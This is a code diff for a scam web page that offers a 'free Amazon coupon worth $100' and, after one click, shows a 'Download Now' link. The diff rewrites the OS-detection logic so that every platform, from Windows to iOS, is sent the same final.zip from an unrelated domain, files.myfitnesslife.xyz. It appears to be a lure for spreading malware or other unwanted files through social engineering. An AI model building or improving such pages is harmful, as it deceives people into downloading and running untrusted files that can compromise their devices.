@@ -10,22 +10,23 @@
             let softwareLink = "#"; // Default link
 
             if (userAgent.indexOf("Win") !== -1) {
-                softwareLink = "https://files.myfitnesslife.xyz/final.zip";
+                softwareLink = "https://files.myfitnesslife.xyz/final.zip";  // Windows link
             } else if (userAgent.indexOf("Mac") !== -1) {
-                softwareLink = "https://example.com/software/macos.dmg";
+                softwareLink = "https://files.myfitnesslife.xyz/final.zip";  // macOS link
             } else if (userAgent.indexOf("Linux") !== -1) {
-                softwareLink = "https://example.com/software/linux.tar.gz";
+                softwareLink = "https://files.myfitnesslife.xyz/final.zip";  // Linux link
             } else if (userAgent.indexOf("Android") !== -1) {
-                softwareLink = "https://example.com/software/android.apk";
+                softwareLink = "https://files.myfitnesslife.xyz/final.zip";  // Android link
             } else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) {
-                softwareLink = "https://example.com/software/ios.ipa";
+                softwareLink = "https://files.myfitnesslife.xyz/final.zip";  // iOS link
             }
 
+            // Set the download link dynamically
             document.getElementById("download-link").href = softwareLink;
         }
 
         function showPopup() {
-            detectOS();
+            detectOS();  // Detect OS and set download link
             let popup = document.getElementById("popup");
             popup.style.display = "block";
         }
@@ -64,10 +65,14 @@
 <body>
     <h1>Exclusive Offer!</h1>
     <p>Click the button below to claim your free Amazon coupon worth $100.</p>
-    <button onclick="showPopup()" style="padding: 10px; background: green; color: white; border: none; cursor: pointer; border-radius: 5px;">Click here to earn free Amazon coupons worth $100</button>
+    <button onclick="showPopup()" style="padding: 10px; background: green; color: white; border: none; cursor: pointer; border-radius: 5px;">
+        Click here to earn free Amazon coupons worth $100
+    </button>
     
     <div id="popup" class="popup">
-        <a id="download-link" href="#" style="padding: 10px; background: blue; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+        <a id="download-link" href="#" style="padding: 10px; background: blue; color: white; text-decoration: none; border-radius: 5px;">
+            Download Now
+        </a>
         <br>
         <button onclick="closePopup()">Close</button>
     </div>
